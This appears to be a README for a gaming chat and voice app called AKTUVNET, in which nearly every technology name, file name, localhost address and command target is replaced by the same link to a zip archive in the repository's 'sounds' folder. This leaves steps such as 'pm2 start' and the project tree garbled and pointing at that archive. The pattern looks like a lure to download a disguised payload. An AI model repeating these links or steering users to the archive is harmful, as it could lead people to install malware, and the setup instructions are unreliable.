# 🎮 AKTUVNET - Gaming Communication Platform

**AKTUVNET** is a next-generation gaming communication platform designed specifically for gamers. Built with modern web technologies, it provides seamless voice/video communication, real-time messaging, game integration, and a stunning gaming-themed UI.

## 🚀 Features

### Core Features
✅ **User Authentication & Security**
- JWT-based authentication
- Secure password hashing with bcrypt
- Session management
- SQLite database for persistent storage

✅ **Real-time Messaging**
- Multiple text channels
- Direct messaging (DM) support
- Real-time message updates via https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip
- Message history stored in database

✅ **Voice & Video Calls**
- WebRTC-based peer-to-peer calls
- HD video support (up to 1280x720)
- High-quality audio with echo cancellation
- Voice activity detection with visual indicators

✅ **Screen Sharing**
- Share entire screen or specific applications
- Audio sharing support
- Easy toggle on/off

✅ **File Sharing**
- Upload and share files (up to 10MB)
- Support for images, documents, and media files
- Download files directly from chat

✅ **Emoji Reactions**
- React to messages with emojis
- See who reacted to messages
- Quick emoji picker

✅ **Push Notifications**
- Desktop notifications for new messages
- Browser notification support
- Electron native notifications

✅ **Desktop Application**
- Native desktop app using Electron
- System tray integration
- Auto-updates support
- Better performance and integration

### 🎮 Gaming Features
- **Game Status Display**: Show what game you're playing
- **Gaming-themed UI**: Neon green/cyan color scheme
- **Performance Optimized**: Built for low-latency gaming communication
- **Multiple servers and channels**: Organize your gaming communities
- **Expandable video feeds**: Double-click to fullscreen
- **Mute/Deafen controls**: Quick audio management
- **Online user status**: See who's available to play

## 📋 Prerequisites

- **https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip** v14 or higher
- **npm** or **yarn**
- Modern web browser (Chrome, Firefox, Edge)
- **For Desktop App**: Electron (included in dependencies)

## 🛠️ Installation

### 1. Clone or Download the Project
```bash
cd AKTUVNET
```

### 2. Install Dependencies
```bash
npm install
```

This will install:
- Express (web server)
- https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip (real-time communication)
- SQLite3 (database)
- JWT (authentication)
- Bcrypt (password hashing)
- Multer (file uploads)
- Electron (desktop app)
- And more...

### 3. Start the Server
```bash
npm start
```

The server will start on `http://localhost:3000`

### 4. Open the Application

**Web Browser:**
Navigate to `https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip`

**Desktop App:**
In a separate terminal, run:
```bash
npm run electron
```

## 📖 Usage Guide

### Getting Started

#### 1. Registration
1. Open the application
2. Click "Register" 
3. Enter:
   - Username (minimum 3 characters)
   - Email address
   - Password (minimum 6 characters)
   - Confirm password
4. Click "Register"

#### 2. Login
1. Enter your email and password
2. Click "Log In"
3. You'll be redirected to the main app

### Messaging

#### Text Channels
1. Select a channel from the left sidebar (e.g., #general)
2. Type your message in the input box
3. Press Enter to send

#### Direct Messages (Coming in UI)
- Currently available via API
- Will be added to UI in future update

#### File Sharing
1. Click the 📎 (attach) button
2. Select a file to upload
3. File will appear in chat with download link
4. Supported: Images, documents, audio, video (max 10MB)

#### Emoji Reactions
1. Hover over any message
2. Click the 😊 button
3. Select an emoji from the picker
4. Click a reaction to remove it

### Voice & Video Calls

#### Join a Call
1. Click on a voice channel (e.g., "General Voice")
2. Allow camera/microphone permissions when prompted
3. Your video will appear with controls

#### Call Controls
- **📹 Camera**: Toggle video on/off
- **🎤 Microphone**: Mute/unmute audio
- **🖥️ Screen Share**: Share your screen
- **❌ Close**: Leave the call

#### Expand Video
- **Double-click** any participant's video to expand to fullscreen
- Double-click again to restore normal size

#### Voice Activity Detection
- Green border appears around participants when they speak
- Automatic detection based on audio levels
- Works in real-time

### Notifications

#### Enable Notifications
1. Browser will ask for permission on first run
2. Click "Allow" to receive notifications
3. Get notified for:
   - New messages in channels
   - Direct messages
   - Mentions (coming soon)

### Server Management

#### Create a Server
1. Click the **+** button in the server list
2. Enter a server name
3. Your new server appears in the list
4. Click to switch between servers

## 🖥️ Desktop Application

### Features
- Native desktop experience
- Better performance
- System tray integration
- Auto-launch on startup (optional)
- Native notifications

### Building the Desktop App

#### For Development
```bash
npm run electron
```

#### Build for Production

**Windows:**
```bash
npm run build
```
Generates installer in `dist/` folder

**macOS:**
```bash
npm run build
```
Generates .dmg file

**Linux:**
```bash
npm run build
```
Generates AppImage

## 🔧 Configuration

### Environment Variables
Create a `.env` file in the root directory:

```env
PORT=3000
JWT_SECRET=your-super-secret-jwt-key-change-this
NODE_ENV=production
```

### Database
- SQLite database is created automatically as `https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip`
- Located in the project root directory
- Contains all users, messages, files, and reactions

## 📁 Project Structure

```
AKTUVNET/
├── https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip              # Main app interface
├── https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip              # Authentication page
├── https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip              # Main styles
├── https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip                # Auth page styles
├── https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip               # Main application logic
├── https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip                 # Authentication logic
├── https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip               # Express & https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip server
├── https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip             # Database operations
├── https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip        # Electron main process
├── https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip            # Dependencies & scripts
├── https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip               # This file
├── uploads/                # Uploaded files directory
└── https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip        # SQLite database
```

## 🎨 Design

**AKTUVNET** features a custom gaming-themed design:
- **Color Scheme**: Dark backgrounds with neon green (#00ffa3) and cyan (#00d4ff) accents
- **Animations**: Smooth transitions and glowing effects
- **Typography**: Bold, modern fonts optimized for readability
- **Icons**: Gaming-inspired iconography
- **Responsive**: Works on desktop, tablet, and mobile devices

## 🔐 Security

- Passwords are hashed using bcrypt
- JWT tokens for secure authentication
- File uploads are validated and sanitized
- SQL injection prevention
- XSS protection

## 🌐 API Endpoints

### Authentication
- `POST /api/register` - Register new user
- `POST /api/login` - Login user
- `GET /api/user/profile` - Get user profile (requires auth)

### Users
- `GET /api/users` - Get all users (requires auth)

### Messages
- `GET /api/messages/:channelId` - Get channel messages (requires auth)
- `GET /api/dm/:userId` - Get direct messages (requires auth)

### Files
- `POST /api/upload` - Upload file (requires auth)

## 🔌 https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip Events

### Client → Server
- `send-message` - Send channel message
- `send-dm` - Send direct message
- `add-reaction` - Add emoji reaction
- `remove-reaction` - Remove emoji reaction
- `join-voice-channel` - Join voice call
- `leave-voice-channel` - Leave voice call
- `voice-activity` - Voice activity update
- `offer`, `answer`, `ice-candidate` - WebRTC signaling

### Server → Client
- `new-message` - New channel message
- `new-dm` - New direct message
- `reaction-update` - Reaction update
- `user-speaking` - User speaking indicator
- `user-list-update` - Online users update
- `user-joined-voice`, `user-left-voice` - Voice channel updates

## 🐛 Troubleshooting

### Camera/Microphone Not Working
- Check browser permissions (camera icon in address bar)
- Ensure no other app is using the devices
- Try refreshing the page
- Check browser console for errors

### Screen Sharing Not Working
- Requires HTTPS in production (works on localhost)
- Check browser permissions
- Some browsers have limited support

### Cannot Connect to Server
- Ensure server is running (`npm start`)
- Check port 3000 is not in use
- Verify firewall settings

### Database Errors
- Delete `https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip` and restart server
- Check file permissions
- Ensure SQLite3 is properly installed

### Notification Issues
- Check browser notification permissions
- Ensure notifications aren't blocked
- Try clearing browser cache

## 🚀 Deployment

### Heroku
1. Create Heroku app
2. Add environment variables
3. Deploy:
```bash
git push heroku main
```

### VPS/Cloud Server
1. Clone repository
2. Install https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip
3. Install dependencies: `npm install`
4. Set environment variables
5. Start with PM2:
```bash
pm2 start https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip
```

### HTTPS
For production, use HTTPS:
- Get SSL certificate (Let's Encrypt)
- Configure in https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip
- Required for WebRTC and notifications

## 📊 Performance Tips

- Use production build for Electron
- Enable gzip compression
- Use CDN for static assets
- Optimize database with indexes
- Limit WebRTC bitrate for slower connections

## 🤝 Contributing

Feel free to submit issues and enhancement requests!

## 📄 License

MIT License - Use freely for personal and commercial projects

## 🎯 Roadmap

### Upcoming Features
- [ ] **Steam Integration**: Auto-detect games from Steam
- [ ] **Game Overlay**: In-game overlay for quick access
- [ ] **Tournament System**: Built-in tournament brackets
- [ ] **Streaming Integration**: Twitch/YouTube integration
- [ ] **User roles and permissions**: Manage gaming communities
- [ ] **Voice channel rooms**: Dynamic voice rooms
- [ ] **Rich text formatting**: Markdown support
- [ ] **Code syntax highlighting**: Share game configs
- [ ] **Mobile app**: React Native version
- [ ] **End-to-end encryption**: Secure communications
- [ ] **Two-factor authentication**: Enhanced security

## 💡 Tips & Tricks

1. **Keyboard Shortcuts**
   - Enter: Send message
   - Shift+Enter: New line
   - Double-click video: Expand

2. **Voice Calls**
   - Use headphones to prevent echo
   - Mute when not speaking
   - Good internet required for HD video

3. **File Sharing**
   - Max 10MB per file
   - Share images, documents, media
   - Files stored in uploads/ folder

4. **Best Practices**
   - Keep messages concise
   - Use reactions instead of short replies
   - Respect others in voice channels

## 📞 Support

For issues or questions:
1. Check this README
2. Check browser console for errors
3. Create an issue on GitHub
4. Contact support

---

**Built with ❤️ using https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip, https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip, WebRTC, and Electron**

## 🎮 About AKTUVNET

AKTUVNET is designed from the ground up for gamers. Whether you're coordinating raids, streaming gameplay, or just hanging out with friends, AKTUVNET provides the tools you need with a sleek, gaming-inspired interface.

### Why AKTUVNET?

- **Gaming-First Design**: Every feature is optimized for gaming communities
- **Low Latency**: Built for real-time gaming communication
- **Modern Tech Stack**: Using the latest web technologies
- **Open Source**: Customize and extend as needed
- **Cross-Platform**: Works on Windows, macOS, Linux, and web browsers

Join the AKTUVNET community and level up your gaming communication! 🚀🎮#   A K T U V N E T  
 